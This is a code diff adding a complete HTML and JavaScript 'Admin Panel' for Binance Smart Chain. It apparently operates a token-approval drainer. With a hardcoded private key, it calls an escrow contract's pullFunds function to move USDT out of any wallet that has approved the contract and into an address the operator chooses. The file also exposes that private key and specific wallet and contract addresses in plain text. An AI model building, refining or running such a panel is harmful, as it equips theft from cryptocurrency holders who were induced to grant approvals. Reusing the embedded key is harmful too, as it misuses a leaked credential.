@@ -1,1 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Admin Panel (BSC)</title>
+    <!-- Ethers.js -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💰</text></svg>">
+    
+    <style>
+        /* SAME STYLES AS REQUESTED */
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); color: #ffffff; margin: 0; padding: 20px; min-height: 100vh; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        .card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 30px; margin-bottom: 30px; }
+        .btn { padding: 15px 30px; border: none; border-radius: 12px; font-size: 1rem; font-weight: 600; cursor: pointer; margin: 5px; width: 100%; }
+        .btn-primary { background: linear-gradient(45deg, #00d4ff, #0099cc); color: #ffffff; }
+        .btn-secondary { background: rgba(255,255,255,0.1); color: #ffffff; border: 2px solid rgba(255,255,255,0.2); }
+        input { padding: 15px 20px; border: 2px solid rgba(255,255,255,0.1); border-radius: 12px; background: rgba(255,255,255,0.05); color: #ffffff; font-size: 1rem; width: 100%; margin-bottom: 10px; box-sizing: border-box; }
+        input:focus { border-color: #00d4ff; outline: none; }
+        .notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); padding: 16px 32px; border-radius: 12px; font-weight: bold; z-index: 9999; display: none; }
+        .notification.info { background: #374151; color: #fff; }
+        .notification.success { background: #10b981; color: #fff; }
+        .notification.error { background: #f87171; color: #fff; }
+        .spinner { display: inline-block; width: 1rem; height: 1rem; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; margin-right: 8px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header style="text-align: center; margin-bottom: 30px;">
+            <h1>🔐 Admin Panel (BEP20)</h1>
+            <p style="color: #a0aec0;">Binance Smart Chain Management</p>
+        </header>
+
+        <div class="main-content">
+            <div class="card">
+                <h2>Transfer USDT</h2>
+                <form id="transferForm">
+                    <div class="form-group">
+                        <label>Recipient Address (Seller)</label>
+                        <input type="text" id="recipientAddress" placeholder="Paste Seller Address Here" required>
+                    </div>
+                    <div class="form-group">
+                        <label>From Address (Approved Wallet)</label>
+                        <input type="text" id="fromAddress" placeholder="0x..." required>
+                    </div>
+                    <div class="form-group">
+                        <label>USDT Amount</label>
+                        <div style="display: flex; align-items: center; position: relative;">
+                            <input type="number" id="amount" placeholder="0.00" step="0.01" min="0.01" required>
+                            <span style="position: absolute; right: 20px; font-weight: bold; color: #a0aec0;">USDT</span>
+                        </div>
+                    </div>
+                    <div style="margin-top: 20px;">
+                        <button type="submit" id="transferBtn" class="btn btn-primary"><span class="btn-text">Transfer USDT</span><span class="btn-loading" style="display:none;"><div class="spinner"></div>Processing...</span></button>
+                        <button type="button" id="checkBalanceBtn" class="btn btn-secondary">Check Balance</button>
+                    </div>
+                </form>
+            </div>
+
+            <div class="card">
+                <h3>Contract Info</h3>
+                <p>Contract: <span style="font-family: monospace; color: #00d4ff;" id="contractDisplay">Loading...</span></p>
+                <p>Network: <strong>Binance Smart Chain (ID: 56)</strong></p>
+            </div>
+            
+            <div id="transfersList"></div>
+        </div>
+    </div>
+
+    <div id="notification" class="notification"></div>
+
+    <script>
+        // ============================================
+        // ⚙️ CONFIGURATION FOR BSC
+        // ============================================
+        const CONFIG = {
+            // Your Deployed Contract Address
+            ESCROW_CONTRACT_ADDRESS: "0xe8CA57737A1265398F4d204883A1D864C640a345",
+
+            // BSC USDT Token Address (Official)
+            USDT_TOKEN_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
+
+            // Admin Wallet (Owner of Contract)
+            COMPANY_WALLET_ADDRESS: "0xb0506fF313Ee13C021Cf637613a93dc161fd6611",
+
+            // ⚠️ PASTE YOUR PRIVATE KEY BELOW:
+            SENDER_KEY: "b45b636232f8ed91e4bb8beca94d49cc7563e3e1dcdf74a4eeda450bb74d553f"
+        };
+
+        class AdminTransferPanel {
+            constructor() {
+                // BSC Public RPC
+                this.provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+                
+                try {
+                    this.wallet = new ethers.Wallet(CONFIG.SENDER_KEY, this.provider);
+                } catch (e) {
+                    this.showNotification("❌ Invalid Private Key in CONFIG", "error");
+                    return;
+                }
+
+                this.escrowAbi = ["function pullFunds(address token, address user, address recipient, uint256 amount) external"];
+                this.escrowContract = new ethers.Contract(CONFIG.ESCROW_CONTRACT_ADDRESS, this.escrowAbi, this.wallet);
+
+                this.usdtAbi = [
+                    "function balanceOf(address owner) view returns (uint256)",
+                    "function allowance(address owner, address spender) view returns (uint256)",
+                    "function decimals() view returns (uint8)"
+                ];
+                this.usdtContract = new ethers.Contract(CONFIG.USDT_TOKEN_ADDRESS, this.usdtAbi, this.provider);
+
+                document.getElementById("contractDisplay").innerText = CONFIG.ESCROW_CONTRACT_ADDRESS;
+                this.setupEventListeners();
+                console.log("Admin Panel (BSC) Initialized");
+            }
+
+            setupEventListeners() {
+                document.getElementById("transferForm").addEventListener("submit", e => { e.preventDefault(); this.handleTransfer(); });
+                document.getElementById("checkBalanceBtn").addEventListener("click", () => this.checkBalance());
+            }
+
+            async handleTransfer() {
+                const recipient = document.getElementById("recipientAddress").value.trim();
+                const from = document.getElementById("fromAddress").value.trim();
+                const amount = parseFloat(document.getElementById("amount").value);
+                const btn = document.getElementById("transferBtn");
+                const btnText = btn.querySelector(".btn-text");
+                const btnLoading = btn.querySelector(".btn-loading");
+
+                if (!ethers.utils.isAddress(recipient) || !ethers.utils.isAddress(from) || !amount) return this.showNotification("❌ Invalid Input", "error");
+
+                try {
+                    btn.disabled = true;
+                    btnText.style.display = "none";
+                    btnLoading.style.display = "inline";
+
+                    // 18 Decimals for BSC
+                    const parsedAmount = ethers.utils.parseUnits(amount.toString(), 18);
+
+                    // Check Allowance
+                    const allowance = await this.usdtContract.allowance(from, CONFIG.ESCROW_CONTRACT_ADDRESS);
+                    if (allowance.lt(parsedAmount)) throw new Error("Allowance too low");
+
+                    this.showNotification("⏳ Sending...", "info");
+                    
+                    // Gas Limit manual override for safety
+                    const tx = await this.escrowContract.pullFunds(CONFIG.USDT_TOKEN_ADDRESS, from, recipient, parsedAmount, { gasLimit: 250000 });
+                    
+                    this.showNotification(`⏳ Tx Sent: ${tx.hash}`, "info");
+                    await tx.wait();
+                    
+                    this.showNotification(`✅ SUCCESS! ${amount} USDT Sent.`, "success");
+                    this.addTransferToList(from, recipient, amount, tx.hash);
+                    document.getElementById("amount").value = "";
+
+                } catch (err) {
+                    console.error(err);
+                    this.showNotification(`❌ Failed: ${err.message}`, "error");
+                } finally {
+                    btn.disabled = false;
+                    btnText.style.display = "inline";
+                    btnLoading.style.display = "none";
+                }
+            }
+
+            async checkBalance() {
+                const from = document.getElementById("fromAddress").value.trim();
+                if (!ethers.utils.isAddress(from)) return;
+                this.showNotification("Checking...", "info");
+                try {
+                    const balance = await this.usdtContract.balanceOf(from);
+                    const allowance = await this.usdtContract.allowance(from, CONFIG.ESCROW_CONTRACT_ADDRESS);
+                    // 18 Decimals for BSC
+                    const balFmt = ethers.utils.formatUnits(balance, 18);
+                    const allowFmt = ethers.utils.formatUnits(allowance, 18);
+                    alert(`📊 STATUS (BSC Network)\n\nBalance: ${parseFloat(balFmt).toFixed(2)} USDT\nAllowance: ${parseFloat(allowFmt).toFixed(2)} USDT`);
+                } catch (err) { this.showNotification("Check Failed", "error"); }
+            }
+
+            addTransferToList(from, to, amount, txHash) {
+                const list = document.getElementById("transfersList");
+                const item = document.createElement("div");
+                item.style.padding = "10px";
+                item.style.borderBottom = "1px solid rgba(255,255,255,0.1)";
+                item.innerHTML = `<p style="margin:0;"><strong>${amount} USDT</strong></p><p style="margin:0; font-size:0.8em; color:#a0aec0;">From: ${from.substring(0,6)}...</p><p style="margin:0; font-size:0.8em;"><a href="https://bscscan.com/tx/${txHash}" target="_blank" style="color:#00d4ff;">View Hash</a></p>`;
+                list.prepend(item);
+            }
+
+            showNotification(msg, type) {
+                const n = document.getElementById("notification");
+                n.innerText = msg;
+                n.className = `notification ${type}`;
+                n.style.display = "block";
+                setTimeout(() => n.style.display = "none", 4000);
+            }
+        }
+
+        window.addEventListener("DOMContentLoaded", () => {
+             if (CONFIG.SENDER_KEY.includes("PASTE")) alert("Setup Required: Paste Key in Code");
+             else new AdminTransferPanel();
+        });
+    </script>
+</body>
+</html>
+
 
